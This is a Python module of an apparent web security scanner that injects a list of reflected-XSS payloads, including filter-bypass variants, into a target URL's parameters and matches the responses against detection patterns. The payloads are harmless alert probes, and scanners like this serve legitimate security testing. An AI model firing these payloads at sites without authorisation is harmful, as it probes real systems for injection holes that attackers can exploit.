"""
XSS（跨站脚本）检测模块
支持反射型XSS检测
"""

import asyncio
import aiohttp
import re
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

from core.base import BaseModule, ScanResult, Severity, ResultType
from core.logger import Logger


@dataclass
class XSSPoint:
    """XSS注入点信息"""
    parameter: str
    injection_type: str  # reflected, stored, dom
    payload: str
    evidence: str
    context: str  # html, attribute, script, url


# XSS测试Payload
XSS_PAYLOADS = [
    # 基础Payload
    ("<script>alert('XSS')</script>", "html"),
    ("<script>alert(1)</script>", "html"),
    ("<img src=x onerror=alert(1)>", "html"),
    ("<svg onload=alert(1)>", "html"),
    ("<body onload=alert(1)>", "html"),
    
    # 绕过过滤
    ("<ScRiPt>alert(1)</sCrIpT>", "html"),
    ("<SCRIPT>alert(1)</SCRIPT>", "html"),
    ("<script >alert(1)</script>", "html"),
    ("<script/src='x'onerror=alert(1)>", "html"),
    
    # 事件处理器
    ("<img src='x'onerror=alert(1)>", "html"),
    ("<img src=1 onerror=alert(1)>", "html"),
    ("<input onfocus=alert(1) autofocus>", "html"),
    ("<marquee onstart=alert(1)>", "html"),
    ("<video><source onerror=alert(1)>", "html"),
    ("<audio src=x onerror=alert(1)>", "html"),
    
    # 属性注入
    ("\"onfocus=alert(1) autofocus=\"", "attribute"),
    ("'onfocus=alert(1) autofocus='", "attribute"),
    ("\"onmouseover=alert(1)\"", "attribute"),
    ("'onmouseover=alert(1)'", "attribute"),
    
    # JavaScript伪协议
    ("<a href=\"javascript:alert(1)\">click</a>", "html"),
    ("<a href='javascript:alert(1)'>click</a>", "html"),
    ("javascript:alert(1)", "url"),
    
    # 编码绕过
    ("<script>alert&#40;1&#41;</script>", "html"),
    ("<script>alert&#x28;1&#x29;</script>", "html"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "html"),
    
    # SVG
    ("<svg><script>alert(1)</script></svg>", "html"),
    ("<svg/onload=alert(1)>", "html"),
    
    # iframe
    ("<iframe src=\"javascript:alert(1)\">", "html"),
    ("<iframe srcdoc=\"<script>alert(1)</script>\">", "html"),
    
    # DOM XSS
    ("#<script>alert(1)</script>", "dom"),
    ("?param=<script>alert(1)</script>", "dom"),
]

# XSS检测标记
XSS_MARKERS = [
    r"<script[^>]*>.*?alert\s*\([^)]*\).*?</script>",
    r"<script[^>]*>.*?alert\s*\([^)]*\)",
    r"onerror\s*=\s*['\"]?alert\s*\([^)]*\)",
    r"onload\s*=\s*['\"]?alert\s*\([^)]*\)",
    r"onfocus\s*=\s*['\"]?alert\s*\([^)]*\)",
    r"onmouseover\s*=\s*['\"]?alert\s*\([^)]*\)",
    r"onclick\s*=\s*['\"]?alert\s*\([^)]*\)",
    r"javascript\s*:\s*alert\s*\([^)]*\)",
    r"<img[^>]+onerror\s*=",
    r"<svg[^>]+onload\s*=",
    r"<iframe[^>]+src\s*=\s*['\"]?javascript:",
]


class XSSScanner(BaseModule):
    """
    XSS漏洞扫描器
    检测Web应用中的跨站脚本漏洞
    """
    
    name = "xss_scanner"
    description = "XSS跨站脚本漏洞检测器"
    author = "PySecScanner"
    version = "1.0.0"
    
    def __init__(self, config=None, logger=None):
        super().__init__(config, logger)
        self.timeout = 10
        self.concurrency = 5
        self.payloads = XSS_PAYLOADS
        self.xss_points: List[XSSPoint] = []
        self.base_url = ""
    
    async def scan(self, target: str) -> List[ScanResult]:
        """
        执行XSS扫描
        
        Args:
            target: 目标URL
            
        Returns:
            扫描结果列表
        """
        # 验证URL
        self.base_url = self._normalize_url(target)
        if not self.base_url:
            self.logger.error(f"无效的URL: {target}")
            return []
        
        self.logger.info(f"目标URL: {self.base_url}")
        
        # 解析参数
        params = self._extract_parameters(self.base_url)
        if not params:
            self.logger.warning("未发现可测试的参数")
            return []
        
        self.logger.info(f"发现参数: {', '.join(params.keys())}")
        
        # 执行XSS测试
        self.xss_points = await self._test_xss(params)
        
        # 生成结果
        results = []
        for xss in self.xss_points:
            result = ScanResult(
                result_type=ResultType.VULNERABILITY,
                title=f"XSS漏洞: {xss.parameter}",
                description=f"参数 '{xss.parameter}' 存在XSS漏洞，类型: {xss.injection_type}，上下文: {xss.context}",
                severity=Severity.MEDIUM,
                target=self.base_url,
                evidence=f"参数: {xss.parameter}\nPayload: {xss.payload}\n证据: {xss.evidence}",
                raw_data=xss.__dict__
            )
            results.append(result)
            self.add_result(result)
        
        # 打印结果
        if self.xss_points:
            self.logger.print_result(
                "发现的XSS漏洞",
                [f"{x.parameter} ({x.injection_type})" for x in self.xss_points]
            )
        else:
            self.logger.info("未发现XSS漏洞")
        
        return results
    
    def _normalize_url(self, url: str) -> str:
        """规范化URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
    
    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """提取URL参数"""
        parsed = urlparse(url)
        params = {}
        
        # GET参数
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key, values in query_params.items():
                params[key] = values[0] if values else ""
        
        return params
    
    async def _test_xss(self, params: Dict[str, str]) -> List[XSSPoint]:
        """测试XSS漏洞"""
        semaphore = asyncio.Semaphore(self.concurrency)
        xss_points: List[XSSPoint] = []
        tested = set()
        
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async def test_param(param_name: str, original_value: str) -> Optional[XSSPoint]:
            async with semaphore:
                for payload, context in self.payloads:
                    test_key = f"{param_name}:{payload[:20]}"
                    if test_key in tested:
                        continue
                    tested.add(test_key)
                    
                    # 构造测试URL
                    test_params = params.copy()
                    test_params[param_name] = payload
                    test_url = self._build_url(test_params)
                    
                    try:
                        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                            async with session.get(test_url) as response:
                                content = await response.text()
                                
                                # 检查payload是否被反射
                                if payload in content:
                                    self.logger.highlight(f"XSS反射: {param_name}")
                                    return XSSPoint(
                                        parameter=param_name,
                                        injection_type="reflected",
                                        payload=payload,
                                        evidence=f"Payload被原样反射到响应中",
                                        context=context
                                    )
                                
                                # 检查XSS标记
                                for pattern in XSS_MARKERS:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        # 确认是我们注入的
                                        if param_name in content or "alert" in content:
                                            self.logger.highlight(f"XSS模式匹配: {param_name}")
                                            return XSSPoint(
                                                parameter=param_name,
                                                injection_type="reflected",
                                                payload=payload,
                                                evidence=f"匹配模式: {pattern}",
                                                context=context
                                            )
                                
                                # 检查部分反射（可能被过滤）
                                if self._check_partial_reflection(payload, content):
                                    self.logger.info(f"可能存在过滤绕过: {param_name}")
                                            
                    except Exception as e:
                        pass
                
                return None
        
        # 创建任务
        tasks = [test_param(name, value) for name, value in params.items()]
        
        # 执行
        completed = 0
        total = len(tasks)
        
        for coro in asyncio.as_completed(tasks):
            result = await coro
            completed += 1
            self.logger.print_progress(completed, total, "XSS测试中")
            
            if result:
                xss_points.append(result)
        
        print()
        
        return xss_points
    
    def _build_url(self, params: Dict[str, str]) -> str:
        """构建测试URL"""
        parsed = urlparse(self.base_url)
        query = urlencode(params)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query,
            parsed.fragment
        ))
    
    def _check_partial_reflection(self, payload: str, content: str) -> bool:
        """检查部分反射（可能存在WAF过滤）"""
        # 检查关键部分是否被反射
        parts = [
            "alert",
            "onerror",
            "onload",
            "onclick",
            "onfocus",
            "javascript:",
            "<script",
            "</script>",
        ]
        
        for part in parts:
            if part.lower() in payload.lower() and part.lower() in content.lower():
                return True
        
        return False
